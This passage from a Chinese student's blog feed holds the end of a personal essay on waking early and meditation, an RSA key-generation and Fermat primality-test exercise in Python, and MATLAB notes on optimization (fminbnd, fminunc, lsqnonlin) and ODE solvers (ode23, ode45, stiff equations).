分钟）</li><li>手机 ipad 充电（顺手）</li><li>收拾出第二天需要穿的衣物（5 分钟）</li><li>借舍友的锅热牛奶，倒入保温杯（6 分钟），给舍友洗锅（3 分钟）</li></ol><p>大概需要一个小时。</p><h3 id="早起"><a href="#早起" class="headerlink" title="早起"></a>早起</h3><p>上了大学，意志力逐渐消退。从大一 7 点起床，到大二 7 点半，到大三 7 点 45（平时第一节没课的话更晚，8：20 是常态），其实这是因为我每天都 12：30 以后才睡，但其实这么晚睡并没有任何益处，我并没有创造更多的价值，反而损害了健康。</p><p>所以<strong>我决定早起，恢复到大一 7 点的状态。</strong></p><blockquote><p>威林克在海豹突击队服役超过 20 年，退役之后还保持着海豹的作息，他的习惯是每天早上 4：45 起床做事。<br>当费里斯问威林克为什么非得早起，威林克回答说早起能让他有一种心理上战胜敌人的感觉。 威林克觉得世界上的某个地方有个敌人，一手拿着冲锋枪一手拿着手榴弹，等着跟他交锋，所以每天早上一睡醒，他就问自己我现在要做什么，才能为将来那个于敌人交战的时刻做好准备？然后他就起来了，开始一天的锻炼和阅读。</p></blockquote><p><strong>早起不是为了多工作一个小时，而是为了用最好的状态开始清醒的 17 个小时。</strong><br>**<br><strong>高效意味着高产出，高产出意味着积累，积累意味着未来无限的可能性。</strong></p><blockquote><p>这里推荐一篇回答<br>如何不痛苦地早起？ - 王振宇的回答 - 知乎 <a href="https://www.zhihu.com/question/22120300/answer/908708574">https://www.zhihu.com/question/22120300/answer/908708574</a></p></blockquote><p>另外，<strong>我想培养起晨跑的习惯。（春天，夏天，初秋）</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1602940980308-16cae4c4-446f-4571-9be8-3af1ca5be6fd.png#align=left&display=inline&height=261&name=image.png&originHeight=522&originWidth=828&size=113127&status=done&style=none&width=414" alt="image.png"></p><p><strong>我想成为自己的主人。</strong></p><h3 id="冥想"><a href="#冥想" class="headerlink" title="冥想"></a>冥想</h3><p>其实我之前坚持过一段时间，但不知道为什么就搁置了。<br>我认为每天晚上的 9 点，是最适合冥想的一段时间。</p>]]></content>
      
      
      <categories>
          
          <category> 文艺 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCE-Cryptography-Experiment</title>
      <link href="/2020/SCE-Cryptography-Experiment/"/>
      <url>/2020/SCE-Cryptography-Experiment/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="生成-RSA-大素数对"><a href="#生成-RSA-大素数对" class="headerlink" title="生成 RSA 大素数对"></a>生成 RSA 大素数对</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br>RSAkey = RSA.generate(<span class="hljs-number">1024</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">RsaKey(n=135828718287577504794345019580082927233382329800436650769778319130905210891299413615216512376642256926</span><br><span class="hljs-string">81082083849207511789369113995656114347658628181817364203829151160294408679251739590425386713208320533180799940969738619</span><br><span class="hljs-string">5247179226323919349310987779260954782675652897977451878557940738099185187754664490831243, e=65537, d=121948850024277284</span><br><span class="hljs-string">31419291319547857604730482453358702002370807784400357979224037562169979688178632524487768280722147336522673889062734116</span><br><span class="hljs-string">12091236526264756659745917698038449276833478093929539387457070306648475772351712570431776434737921224077076846006461005</span><br><span class="hljs-string">1801442191171153628914016094739518761772299602223169, p=106966107287469170015624352521638251586863407906376169924940482</span><br><span class="hljs-string">70893593178051022233452907429273165871602433433280712262828660157650519133674850464955099769, q=12698294976981883899887</span><br><span class="hljs-string">05757908736918629112987783691507779835783942064221972829430441724076915068135969878213856988519323444267214248422535888</span><br><span class="hljs-string">1222134150947, u=748951926994679052549581035821877331925827771100922884099976839588394981271357878319645686189368446921</span><br><span class="hljs-string">7133192361022681583376512653412786705315289991596596)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>注意这个 Crypto 库一般情况在导入的时候都会出错，有几种情况，我介绍一下我遇到的，就是我之前安装了 pycrypto 这个库，但是这个库最新的一版是 2014 年，已经不兼容了，当我尝试 uninstall 它时，报错<br><code>ERROR: Cannot uninstall &#39;pycrypto&#39;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</code><br>这时候，我们必须全局搜索 pycrypto，并手动删除那个文件夹<br>然后在<strong>cmd 下</strong>安装<br><code>pip install pycryptodome --user</code></p><blockquote><p>我也不知道为什么必须在 cmd 下安装，一开始用 powershell 安装的时候我在 Python37 文件夹中找不到它…</p></blockquote><h1 id="Fermat-定理检验素数"><a href="#Fermat-定理检验素数" class="headerlink" title="Fermat 定理检验素数"></a>Fermat 定理检验素数</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FermatPrimalityTest</span>(<span class="hljs-params">m,k</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    m:给定奇整数</span><br><span class="hljs-string">    k:安全参数，重复K次</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> m%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(k):<br>        a = random.randint(<span class="hljs-number">2</span>,m<span class="hljs-number">-2</span>)<br>        g = gmpy2.gcd(a,m)<br>        <span class="hljs-keyword">if</span> g==<span class="hljs-number">1</span>:<br>            r = gmpy2.powmod(a,m<span class="hljs-number">-1</span>,m)<br>            <span class="hljs-keyword">if</span> r ==<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unconstrained-Optimization</title>
      <link href="/2020/Unconstrained-Optimization/"/>
      <url>/2020/Unconstrained-Optimization/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="无约束优化"><a href="#无约束优化" class="headerlink" title="无约束优化"></a>无约束优化</h1><h2 id="单变量优化-最小值"><a href="#单变量优化-最小值" class="headerlink" title="单变量优化(最小值)"></a>单变量优化(最小值)</h2><h3 id="fminbnd’命令–查找单变量函数在定区间上的最小值"><a href="#fminbnd’命令–查找单变量函数在定区间上的最小值" class="headerlink" title="`fminbnd’命令–查找单变量函数在定区间上的最小值"></a>`fminbnd’命令–查找单变量函数在定区间上的最小值</h3><p><code>x = fminbnd(fun,x1,x2)</code> 返回一个值 x，该值是 fun 中描述的标量值函数在区间 x1 &lt; x &lt; x2 中的局部最小值。<br><code>x = fminbnd(fun,x1,x2,options)</code> 如 options = optimset(‘Display’,’iter’)在常微分方程中有详细的描述<br><code>x = fminbnd(problem)</code><br><code>[x,fval] = fminbnd(___)</code> 返回目标函数在 fun 的解 x 处计算出的值。</p><blockquote><p>即求最小值的位置和函数值</p></blockquote><p>如</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab">fun = @<span class="hljs-built_in">sin</span>;<br>[x,fval] = fminbnd(fun,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>)<br><span class="hljs-comment">%输出</span><br>x = <span class="hljs-number">4.7124</span><br>fval = <span class="hljs-number">-1.0000</span><br></code></pre></td></tr></table></figure><p><code>[x,fval,exitflag] = fminbnd(___)</code><br><code>[x,fval,exitflag,output] = fminbnd(___)</code></p><h2 id="双变量优化-最小值"><a href="#双变量优化-最小值" class="headerlink" title="双变量优化(最小值)"></a>双变量优化(最小值)</h2><h3 id="fminunc信赖域法和拟牛顿法"><a href="#fminunc信赖域法和拟牛顿法" class="headerlink" title="fminunc信赖域法和拟牛顿法"></a><code>fminunc</code>信赖域法和拟牛顿法</h3><p><code>x = fminunc(fun,x0)</code><br><code>x = fminunc(fun,x0,options)</code><br><code>x = fminunc(problem)</code><br><code>[x,fval] = fminunc(___)</code><br><code>[x,fval,exitflag,output] = fminunc(___)</code><br><code>[x,fval,exitflag,output,grad,hessian] = fminunc(___)</code><br>这里看一个<strong>双变量加传参的特殊例子</strong>。求<br>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span> = <span class="hljs-title">examfminunc</span><span class="hljs-params">(x,a,b)</span></span><br>x = x(<span class="hljs-number">1</span>)^<span class="hljs-number">2</span>/a+x(<span class="hljs-number">2</span>)^<span class="hljs-number">2</span>/b;<br></code></pre></td></tr></table></figure><p>源程序<code>x = fminunc(@examfminunc,[1,1],[],2,2)%x=1,y=1是初始值</code></p><blockquote><p>我也不知道这是怎么传进去的参……这个顺序就很迷，但去掉那个[]就会报错无法执行赋值，因为此类型的变量不支持使用点进行索引后期在看书的时候发现那里似乎是 opt 字段，传空数组即不对 opt 进行修改于是我尝试修改成 <code>x = fminunc(@examfminunc,[1,1],&#39;&#39;,2,2)</code>，发现果然也能运行</p></blockquote><h2 id="lsqnonlin-拟合非线性最小二乘系数"><a href="#lsqnonlin-拟合非线性最小二乘系数" class="headerlink" title="lsqnonlin 拟合非线性最小二乘系数"></a><code>lsqnonlin</code> 拟合非线性最小二乘系数</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>x = lsqnonlin(fun,x0)</code><br><code>x = lsqnonlin(fun,x0,lb,ub)</code> defines a set of lower and upper bounds on the design variables in x, so that the solution is always in the range . You can fix the solution component x(i) by specifying .<br><code>x = lsqnonlin(fun,x0,lb,ub,options)</code><br>主要用于最小二乘法寻找最优点。（直接把函数值传进去寻找最小值）</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728371105-85bc1f9a-3db9-4992-ab4e-f40c316f01e4.png#align=left&display=inline&height=88&originHeight=88&originWidth=565&size=0&status=done&style=none&width=565"></p><h3 id="示例：飞机定位"><a href="#示例：飞机定位" class="headerlink" title="示例：飞机定位"></a>示例：飞机定位</h3><p>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span> = <span class="hljs-title">feijidingwei</span><span class="hljs-params">(x,x0,y0,theta,sigma,d4,sigma4)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-number">3</span><br>    f(<span class="hljs-built_in">i</span>) = (<span class="hljs-built_in">atan2</span>(x(<span class="hljs-number">1</span>)-x0(<span class="hljs-built_in">i</span>),x(<span class="hljs-number">2</span>)-y0(<span class="hljs-built_in">i</span>))-theta(<span class="hljs-built_in">i</span>))/sigma(<span class="hljs-built_in">i</span>);<span class="hljs-comment">%最小二乘的1~3个参数（注意没有平方，lsqcurvefit函数会加上）</span><br><span class="hljs-keyword">end</span><br>f(<span class="hljs-number">4</span>) = (<span class="hljs-built_in">sqrt</span>((x(<span class="hljs-number">1</span>)-x0(<span class="hljs-number">4</span>))^<span class="hljs-number">2</span>+(x(<span class="hljs-number">2</span>)-y0(<span class="hljs-number">4</span>))^<span class="hljs-number">2</span>)-d4)/sigma4;<span class="hljs-comment">%最小二乘的第四个参数</span><br>主程序<br>X = [<span class="hljs-number">746</span> <span class="hljs-number">629</span> <span class="hljs-number">1571</span> <span class="hljs-number">155</span>];<br>Y = [<span class="hljs-number">1393</span> <span class="hljs-number">375</span> <span class="hljs-number">259</span> <span class="hljs-number">987</span>];<br>theta = [<span class="hljs-number">161.2</span>,<span class="hljs-number">45.1</span>,<span class="hljs-number">309.0</span><span class="hljs-number">-360</span>]*<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>/<span class="hljs-number">360</span>;<br>sigma = [<span class="hljs-number">0.8</span>,<span class="hljs-number">0.6</span>,<span class="hljs-number">1.3</span>]*<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>/<span class="hljs-number">360</span>;<br>d4 = <span class="hljs-number">864.3</span>;<br>sigma4 = <span class="hljs-number">2</span>;<br>x0 = [<span class="hljs-number">900</span>,<span class="hljs-number">700</span>];<span class="hljs-comment">%大约估计的飞机位置</span><br>[x,norm,res,exit,out] = lsqnonlin(@feijidingwei,x0,[],[],[],X,Y,theta,sigma,d4,sigma4)<span class="hljs-comment">%注意这里主初始值就是x0，然后接着三个空数组，然后才能把额外参数传进来</span><br><span class="hljs-comment">%输出</span><br>x =<br><br>   <span class="hljs-number">1.0e+02</span> *<br><br>   <span class="hljs-number">9.783070295413857</span>   <span class="hljs-number">7.239837766517786</span><br><br><br>norm =<br><br>   <span class="hljs-number">0.668471174541973</span><br></code></pre></td></tr></table></figure><blockquote><p>lsqcurvefit 也可以最小二乘但是尝试了许多方法它都无法传入更多的参数……遂放弃</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 无约束优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Differential-Equations</title>
      <link href="/2020/Differential-Equations/"/>
      <url>/2020/Differential-Equations/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="非刚性常微分方程"><a href="#非刚性常微分方程" class="headerlink" title="非刚性常微分方程"></a>非刚性常微分方程</h1><p>形如类的方程,反求出 y 的值,并最终画出原函数图像</p><h2 id="ode23-–-求解非刚性微分方程-低阶方法"><a href="#ode23-–-求解非刚性微分方程-低阶方法" class="headerlink" title="ode23 – 求解非刚性微分方程 - 低阶方法"></a>ode23 – 求解非刚性微分方程 - 低阶方法</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>[t,y] = ode23(odefun,tspan,y0)</code><br><code>[t,y] = ode23(odefun,tspan,y0,options)</code><br><code>[t,y,te,ye,ie] = ode23(odefun,tspan,y0,options)</code><br><code>sol = ode23(___)</code></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><code>[t,y] = ode23(odefun,tspan,y0)</code>（其中 tspan = [t0 tf]）求微分方程组 从 到 的积分，初始条件为 。<strong>解数组 中的每一行都与列向量 中返回的值相对应。</strong>,必须返回矩阵才能一一对应!<br><strong>参数</strong><code>odefun</code><br><strong>要求解的函数，指定为指向待积分函数的句柄。</strong><br>对于标量 t 和列向量 y 来说，函数 dydt = odefun(t,y) 必须返回数据类型为 single 或 double 的列向量 dydt，该列向量对应于 f(t,y)。odefun 必须同时接受输入参数 t 和 y，即使其中一个参数未在函数中使用也是如此。<br>例如，要解算 y′=5y−3，请使用此函数：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">odefun</span><span class="hljs-params">(t,y)</span></span><br>dydt = <span class="hljs-number">5</span>*y<span class="hljs-number">-3</span>;<br></code></pre></td></tr></table></figure><p>对于方程组，odefun 的输出为向量。向量中的每个元素是一个方程的解。例如，要求解<br><img src="https://cdn.nlark.com/yuque/__latex/01fc0ccb6f22cb3b91827d6030e71460.svg#card=math&code=y%E2%80%B2_1%3Dy_1%2B2y_2%0A%0A&height=18&width=103"><br><img src="https://cdn.nlark.com/yuque/__latex/536d376843daf878ea156fba747db4be.svg#card=math&code=y%E2%80%B2_2%3D3y_1%2B2y_2&height=18&width=112"></p><p>使用函数：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">odefun</span><span class="hljs-params">(t,y)</span></span><br>dydt = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<br>dydt(<span class="hljs-number">1</span>) = y(<span class="hljs-number">1</span>)+<span class="hljs-number">2</span>*y(<span class="hljs-number">2</span>);<br>dydt(<span class="hljs-number">2</span>) = <span class="hljs-number">3</span>*y(<span class="hljs-number">1</span>)+<span class="hljs-number">2</span>*y(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><div class="note note-important">            <p>tspan</p>          </div><p><strong>积分区间，指定为向量。</strong>tspan 必须至少是一个二元素向量 [t0 tf]，用于指定初始时间和最终时间。要获取 t0 到 tf 之间的特定时间的解，请使用 [t0,t1,t2,…,tf] 形式的长向量。tspan 中的元素必须单调递增或单调递减。<br>求解器在初始时间 tspan(1) 施加由 y0 给出的初始条件，然后求 tspan(1) 到 tspan(end) 的积分：<br>如果 tspan 有两个元素，[t0 tf]，求解器将返回在该区间内的每个内部积分步计算的解。<br>如果 tspan 包含两个以上的元素，[t0,t1,t2,…,tf]，求解器将返回在给定点处计算的解。但是，求解器不会精确步进到 tspan 中指定的每个点。此时，求解器使用自己的内部积分步来计算解，然后在 tspan 中请求的各点处计算解。在指定点处生成的解与在每个内部积分步计算的解具有相同的准确度级别。示例</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724367-1cc94ea8-9bc5-4df5-991a-ee7a5e135fe9.png#align=left&display=inline&height=279&originHeight=279&originWidth=801&size=0&status=done&style=none&width=801"></p><h4 id="对于二阶非刚性-ODE-方程"><a href="#对于二阶非刚性-ODE-方程" class="headerlink" title="对于二阶非刚性 ODE 方程"></a>对于二阶非刚性 ODE 方程</h4><p>如$y_1’’- (1-y_1^2)*y_1’+y_1=0$,这是一个<code>van der Pol </code>方程.<br>二阶方程做一阶变换<br>令$y_2=y_1’$,因此$y_2’=(1-y_1^2)*y_2+y_1$<br>类似的对应关系<img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724217-10c4acb3-9586-46a1-a955-b4fbc0909460.png#align=left&display=inline&height=346&originHeight=346&originWidth=744&size=0&status=done&style=none&width=744"><br>具体 matlab 实现</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%vdp1.m文件</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">vdp1</span><span class="hljs-params">(t,y)</span></span><br>dydt = [y(<span class="hljs-number">2</span>); (<span class="hljs-number">1</span>-y(<span class="hljs-number">1</span>)^<span class="hljs-number">2</span>)*y(<span class="hljs-number">2</span>)-y(<span class="hljs-number">1</span>)];<span class="hljs-comment">%将方程两边作为二维矩阵的两个行向量</span><br></code></pre></td></tr></table></figure><p>使用 ode23 函数、时间区间 [0 20] 和初始值 [2 ; 0]来解算该 ODE。生成的输出即为时间点 t 的列向量和解数组 y。y 中的每一行都与 t 的相应行中返回的时间相对应。y 的第一列与 相对应，第二列与 相对应。</p><blockquote><p>虽然初始值是上下排列,但最后得到的数据是左右排列(一列是对应一个 y,感觉好像转置了)</p></blockquote><p>调用文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab">[t,y] = ode23(@vdp1,[<span class="hljs-number">0</span> <span class="hljs-number">20</span>],[<span class="hljs-number">2</span>; <span class="hljs-number">0</span>]);<span class="hljs-comment">%使用@文件名可以调用里面的函数(最好文件名和函数名一致)</span><br><span class="hljs-built_in">plot</span>(t,y(:,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;-o&#x27;</span>,t,y(:,<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;-o&#x27;</span>)<span class="hljs-comment">%绘制y1和y2的解图</span><br>title(<span class="hljs-string">&#x27;Solution of van der Pol Equation (\mu = 1) with ODE23&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;Time t&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Solution y&#x27;</span>);<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;y_1&#x27;</span>,<span class="hljs-string">&#x27;y_2&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>注意</strong><br><code>ode23 </code>仅适用于使用两个输入参数（t 和 y）的函数。但是，通过在函数外部定义参数并在指定函数句柄时传递这些参数，可以传入额外参数。</p><h5 id="传入额外参数"><a href="#传入额外参数" class="headerlink" title="传入额外参数"></a>传入额外参数</h5><p>解$y’’=\frac{A}{B}ty$<br>重写令$y_1’=y_2$,因此$y_2’=\frac{A}{B}ty_1$<br>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">odefun</span><span class="hljs-params">(t,y,a,b)</span></span><br>dydt = [y(<span class="hljs-number">2</span>);(a/b)*t.*y(<span class="hljs-number">1</span>)]<br></code></pre></td></tr></table></figure><p>调用文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab">A = <span class="hljs-number">1</span>;<br>B = <span class="hljs-number">2</span>;<br>tspan = [<span class="hljs-number">0</span> <span class="hljs-number">5</span>];<br>y0 = [<span class="hljs-number">0</span>;<span class="hljs-number">0.01</span>];<br>[t,y] = ode23(@(t,y) odefun(t,y,A,B), tspan, y0);<br><span class="hljs-built_in">plot</span>(t,y(:,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;-o&#x27;</span>,t,y(:,<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;-.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者一个文件试了一下也是可以的</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs matlab">odefun = @(t,y,a,b)[y(<span class="hljs-number">2</span>);(a/b)*t.*y(<span class="hljs-number">1</span>)];<br>A = <span class="hljs-number">1</span>;<br>B = <span class="hljs-number">2</span>;<br>tspan = [<span class="hljs-number">0</span> <span class="hljs-number">5</span>];<br>y0 = [<span class="hljs-number">0</span>;<span class="hljs-number">0.01</span>];<br>[t,y] = ode23(@(t,y) odefun(t,y,A,B), tspan, y0);<br><span class="hljs-built_in">plot</span>(t,y(:,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;-o&#x27;</span>,t,y(:,<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;-.&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724248-86d48064-ce5a-44bd-845d-7262abf66018.png#align=left&display=inline&height=411&originHeight=411&originWidth=546&size=0&status=done&style=none&width=546"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>ode23</code> 是<code> Bogacki</code> 和 <code>Shampine </code>的显式 <code>Runge-Kutta (2,3)</code> 对的实现。在容差较宽松且刚度适中的情况下，它可能比 <code>ode45</code> 更加有效。<code>ode23 </code>是单步求解器</p><h2 id="ode45-–-求解非刚性微分方程-中阶方法"><a href="#ode45-–-求解非刚性微分方程-中阶方法" class="headerlink" title="ode45 – 求解非刚性微分方程 - 中阶方法"></a>ode45 – 求解非刚性微分方程 - 中阶方法</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p><code>[t,y] = ode45(odefun,tspan,y0)</code><br><code>[t,y] = ode45(odefun,tspan,y0,options)</code><br><code>[t,y,te,ye,ie] = ode45(odefun,tspan,y0,options)</code><br><code>sol = ode45(___)</code><br><strong>ode45 是一个通用型 ODE 求解器，是解算大多数问题时的首选。但是，对于刚性问题或需要较高准确性的问题，其他 ODE 求解器可能更适合。</strong><br>其实用法和 ode23 几乎一样,只是生成的数据图的数据点更密了.<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724225-3bda888f-dd28-4fa8-a64b-96312c87fd2d.png#align=left&display=inline&height=492&originHeight=492&originWidth=612&size=0&status=done&style=none&width=612"></p><h1 id="刚性常微分方程"><a href="#刚性常微分方程" class="headerlink" title="刚性常微分方程"></a>刚性常微分方程</h1><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>所谓刚性方程，就是说存在两(多)重尺度，一个尺度比另外一个尺度大很多。所导致的麻烦就是在计算中很难兼顾两者。例如下面的方程：dx=-100x-100.1ydy=100.1x-100y 两个特征值 lambda_1 = -200.1，lambda_2 = -0.1 所以解表现为 a1_exp(-200.1_X) + a2_exp(-0.1_X)，无论你用什么样的尺度(单一尺度)都不能很好刻画解的行为。一个是快变行为，一个是慢变行为。 所有这样的方程计算时候，稳定性条件比较苛刻。实际情况要比这还复杂得多。<br>对于刚性和非刚性微分方程的区分，可以简单的转变为在将原方程转换为常微分方程组后，进行一个简单的系数判断：<br>例如：</p><p>$$<br>y’’’ - 3y’’ - y’y = 0, y(0) = 0, y’(0) = 0, y’’(0) = -1;<br>$$</p><p>在这里可以设  y1 = y, y2 = y’, y3 = y’’, 有</p><p>$$<br>  y_1’ = y_2,      　y_1(0) = 0,<br>$$</p><p>$$<br>  y_2’ = y_3,       y_2(0) = 1,<br>$$</p><p>$$<br>  y_3’ = 3y_3 + y_2y_1,   y_3(0) = -1,<br>$$　　<br>这里可以简单判断出方程组的右侧系数矩阵值差异不大，得到的特征值差异随之也不大，可以简单判断为非刚性微分方程。<br>MATLAB中<strong>解非刚性微分方程常用 ode45 ;</strong></p><p>又例如：<br><img src="https://cdn.nlark.com/yuque/__latex/15bc51240669bc7502d5ab1d0098d0af.svg#card=math&code=y%27%27%20-%201000%281%20-%20y%5E2%29y%27%20%2B%20y%20%3D%200%2C%20y%280%29%20%3D%202%2C%20y%27%280%29%20%3D%200%3B&height=23&width=348"></p><p>在这里可以设<img src="https://cdn.nlark.com/yuque/__latex/0feecf5b95ff7b36da6886a607fb0ec6.svg#card=math&code=y1%20%3D%20y%2C%20y2%20%3D%20y%27&height=20&width=107">, 有</p><p><img src="https://cdn.nlark.com/yuque/__latex/6a7aa13037b30c52d102fda78eda566b.svg#card=math&code=y1%27%20%3D%20y2%2C%20%20%20%20%20%20%20%20%20%20%20y1%280%29%20%3D%202%2C&height=21&width=142"></p><p><img src="https://cdn.nlark.com/yuque/__latex/1f8fa6198c72143f8fb1cdcf7fe6db14.svg#card=math&code=y2%27%20%3D%201000%281%20-%20y1%5E2%29y2%20-%20y1%2C%20%20y2%280%29%20%3D%200%2C&height=23&width=280"><br>　　<br>这里可以简单判断出方程组的右侧系数矩阵值差异较大，得到的特征值差异随之较大，可以简单判断为刚性微分方程。<br>MATLAB中<strong>解刚性微分方程常用 ode15s , ode23s , ode23t , ode23tb ;</strong></p><blockquote><p>如果区分不出来就多试试.</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724456-ec605cbc-c9d8-4d63-8ab6-f1768eec3e6d.png#align=left&display=inline&height=362&originHeight=362&originWidth=704&size=0&status=done&style=none&width=704"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 